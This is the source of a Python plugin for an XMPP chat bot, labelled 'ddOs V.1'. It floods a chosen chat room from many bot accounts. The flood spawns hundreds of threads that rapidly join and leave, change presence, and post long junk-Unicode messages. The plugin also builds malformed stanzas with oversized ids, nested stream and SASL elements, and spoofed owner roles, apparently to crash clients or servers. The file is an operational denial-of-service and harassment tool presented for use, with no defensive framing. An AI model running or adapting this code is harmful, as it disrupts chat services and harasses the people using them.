# zoecher 6.x plugin
# -*- coding: utf-8 -*-

#############################
###*ddOs V.1|*   ###        *
#############################
## daa@xmpp.ru ##
#################


import os, xmpp, time, sys, time, pdb, urllib, threading, types, random
VIPE = {}
ONVIPE = []
REP_OTAKE={'n':0,'err':0,'thr':0}
GET_NI=[]
GEN_NI=[]
vers = {'botver': {'name': 'ddos', 'ver': 'v1', 'os': 'Unix'}}
statusx = ['!⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦⠀ !⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦!⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦⠀ !⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦']
showx = ['dnd','xa','away','online','chat']
prshanger = 100
servers = ['jsmart.web.id']
messages = ['֝֝֝֝֝֝֝</session>  BO⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄ⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄ⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄ⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄ⁄⁄⁄ेेॄॄॄ⁄⁄ेे⁄⁄ेेॄॄॄBO ','//. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦⠀ !⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦!⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦⠀ !⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚/']
def hanger_join(cl, groupchat):
  nick = 'zOeCh-'+str(random.randrange(00, 15))+u''
  GEN_NI.append(groupchat+'/'+nick)
  prs=xmpp.protocol.Presence(groupchat+'/'+nick)
  prs.setStatus(random.choice(statusx))
  prs.setShow(random.choice(showx))
  prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
  try:
    cl.send(prs)
  except:
    pass

def prshanger_timer(type,source,parameters):
  global prshanger
  time.sleep(300)
  if prshanger:
    prshanger = 0
    reply(type, source, u'Finished!')

def prshanger_thread(p):
  if len(p)>10:
    if p[0] in [101] and p[6] in [49]:
      return True
  return False
		      
def prshanger_start(type,source,parameters):
  global prshanger
  if parameters:
    if not parameters.count('@'):
      reply(type, source, u'Wrong command.')
      return
    body = parameters.split()
    if parameters.count(u'santa'):
      reply(type, source, u'Wrong room.')
      return
    conf = body[0].lower()
    prshanger = 1
    reply(type,source,u'Ok')
    threading.Thread(None, prshanger_timer, 'prshanger_timer'+str(random.randrange(0, 999)), (type,source,parameters)).start()
    for x in range(0, 200):
      threading.Thread(None, prshanger_auth, 'prshanger_auth'+str(random.randrange(0, 999)), (type,source,conf)).start()           
		
def prshanger_auth(type,source,conf):
  if not prshanger:
    return
  try:
    server = random.choice(servers)
    name, domain, password, newBotJid, mainRes = 'run-'+str(random.randrange(00, 16))+'', server, '590590', 0, 'zoech_'+str(random.randrange(0, 35))
#    name, domain, password, newBotJid, mainRes = 'rod-'+str(random.randrange(00, 34))+'', server, '590590', 0, 'zoech_'+str(random.randrange(0, 35))
    node = unicode(name)
    lastnick = name
    jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
    print u''+unicode(jid)
    psw = u''
    cl = xmpp.Client(jid.getDomain(), debug=[])
    con = cl.connect()
    print u'Connected'
    au=cl.auth(jid.getNode(), password, jid.getResource())
    print u'Autheticated'
    cl.sendInitPresence()
    cl.RegisterHandler('iq',version)
    cl.RegisterHandler('message',message)
    if cl.isConnected():
      threading.Thread(None, hanger_change_nicks, 'hanger_change_nicks'+str(random.randrange(0, 999)), (cl,conf)).start()
      threading.Thread(None, hanger_change_prs, 'hanger_change_prs'+str(random.randrange(0, 999)), (cl,conf)).start()
      threading.Thread(None, hanger_message, 'hanger_message'+str(random.randrange(0, 999)), (cl,conf)).start()
    else:
      threading.Thread(None, prshanger_auth, 'prshanger_auth', (type,source,conf)).start()
      return
  except:
    pass

def version(cl,iq):
	fromjid = iq.getFrom()
	global vers
	if not iq.getType() == 'error':
		if iq.getTags('query', {}, xmpp.NS_VERSION):
			if not vers['botver']['os']:
				osver=''
				if os.name=='nt':
					osname=os.popen("ver")
					osver=osname.read().strip().decode('utf8')+'\n'
					osname.close()			
				else:
					osname=os.popen("uname -sr", 'r')
					osver=osname.read().strip()+'\n'
					osname.close()			
				pyver = ''
				vers['botver']['os'] = pyver
			result = iq.buildReply('result')
			query = result.getTag('query')
			query.setTagData('name', 'zOeCher Child')
			query.setTagData('version', '5.x')
			query.setTagData('os', '{Şαŋτα•τєαм™ 2ờ1ờ-2ờ13 ©}')
			try:
                          cl.send(result)
                        except:
                          pass


def hanger_change_prs(cl, conf):
  prs=xmpp.protocol.Presence()
  prs.setShow(random.choice(showx))
  prs.setStatus(random.choice(statusx))
  while prshanger and cl.isConnected():
    hanger_join(cl, conf)
    time.sleep(0)
    prs.setShow(random.choice(showx))
    prs.setStatus(random.choice(statusx))
    time.sleep(0)
    hanger_leave(cl,conf)
    time.sleep(0)
    hanger_join(cl,conf)
    time.sleep(0)
    prs.setShow(random.choice(showx))
    prs.setStatus(random.choice(statusx))
  if prshanger:
    try:
      threading.Thread(None, prshanger_auth, 'prshanger_auth'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass



def hanger_message(cl,conf):
  z=0
  hanger_join(cl,conf)
  z+=1
  time.sleep(0)
  try:
    for x in range(0, 200):
      text = random.choice(messages)+str(random.randrange(0, 999))
      omsg = xmpp.protocol.Message(conf, text, 'groupchat')
      cl.send(omsg)
      hanger_leave(cl,conf)
  except:
    pass
  if prshanger:
    try:
      threading.Thread(None, prshanger_auth, 'prshanger_auth'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def message(cl,msg):
  pass

def hanger_leave(cl,groupchat,status='*BYE*'):
  prs=xmpp.Presence(groupchat, 'unavailable')
  try:
    cl.send(prs)
  except:
    pass
  
def hanger_change_nicks(cl, conf):
  z=0
  while prshanger and cl.isConnected():
    hanger_join(cl, conf)
    time.sleep(0)
    z+=1
  if prshanger:
    try:
      threading.Thread(None, prshanger_auth, 'prshanger_auth'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def prshanger_stop(type, source, parameters):
  global prshanger
  if prshanger:
    prshanger = 0
    reply(type,source,u'Stopped')
    return
  else:
    reply(type,source,u'Not Active')
    
def mousetrap_join(cl,groupchat,nick):
        add=['|','_','/','.','0']
        botnick = generate_mousetrap(random.Random().randint(7,1100))
        if MOUSE_NICK:
                botnick=random.choice(MOUSE_NICK)
        CAPS = 'http://www.syriatalk.org/caps'
        NODE_ = u'<presence to="%TO_ROOM%/%NICK%"><priority>%PRIORETET%</priority><x xmlns="http://jabber.org/protocol/muc" /><c xmlns="http://jabber.org/protocol/caps" node="%CAPS%" ver="" /><show>%SHOW%</show><x xmlns="http://qip.ru/x-status" id="100"><title></title></x><status>hgfhhfmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</status></presence>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id="getros">%PRIORETET%<jוNcרg xmlns="jabber:iq:roster"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq  type="result" xml:lang="en" to="%TO_ROOM%/%NICK%" id="Mackdos.alrb">%PRIORETET%<Mackdos.alrb xmlns="http ://jabber.org/protocol/profile"> <stream:stream xmlns:stream="http ://etherx.jabber.org/streams" version="1.3.6" xml:lang="en" to="${param.full}"/> <success xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/><stream:stream xmlns:stream="http://etherx.jabber.org/streams"/><stream:stream xmlns:stream="http://etherx.jabber.org/streams"/><stream:stream xmlns:stream="http://etherx.jabber.org/streams" type="error" to="${param.full}" id="Mackdos.alrb"><auth xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/></stream:stream> </Mackdos.alrb></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to=%TO_ROOM%/%NICK%"" type="get" id="_arab_1498>>>>>>>>>>[)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))>>>70http://arab5123902"><ping xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<presence to="%TO_ROOM%/%NICK%" id="request_2308">%PRIORETET%<status></status><priority>0</priority><stream:stream xmlns="d"><x xmlns="vcard-temp:x:update"><photo/></x><c xmlns="http://jabber.org/protocol/caps" node="" ver="=" hash=""/><x xmlns="http://jabber.org/protocol/muc#user"><itemjid="%TO_ROOM%/%NICK%" affiliation="owner" role="moderator"/></x></stream:stream></presence>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id="A((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((A"><query xmlns="jabber:iq:version"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="result" id="XmlnsTenDaxmlns">%PRIORETET%<x xmlns="http://jabber.org/protocol/profile"><stream:stream/><stream:stream/><stream:stream/><stream:stream/><success xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind"/></x></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id=A((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((A"><query xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id=A)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))A><query xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id="Spam)))))))))))))))))">%PRIORETET%<ping xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" xml="ar" id="2525999" type="get">%PRIORETET%<session xmlns="http://www.google.com/session" id="99954676655" type="initiate" initiator=""/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<message to="%TO_ROOM%/%NICK%" type="tenda">%PRIORETET%<error code="">%PRIORETET%</error></message>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq id="A█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;LA" type="get" to="%TO_ROOM%/%NICK%"><query xmlns="http://jabber.org/protocol/disco#info" node="http://jabber.org/protocol/rosterx"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')                               
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" id="A█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;LA" type="get"><query xmlns="jabber:iq:version"><name>home</name><version>123456</version><os>pc version</os></query></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        node=xmpp.simplexml.XML2Node(unicode(NODE_).encode('utf8'))

        prs = xmpp.protocol.Presence(groupchat+'/'+botnick)
        prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
        try:
                cl.send(node)
        except:
                pass
        threading.Thread(None, mousetrap_query, 'mousetrap_query'+str(random.randrange(0, 999)), (cl,groupchat,nick,)).start()
        	
register(prshanger_start, Prefix+'zoech', 9)
register(prshanger_stop, Prefix+'stop', 9)
#########################################################################################

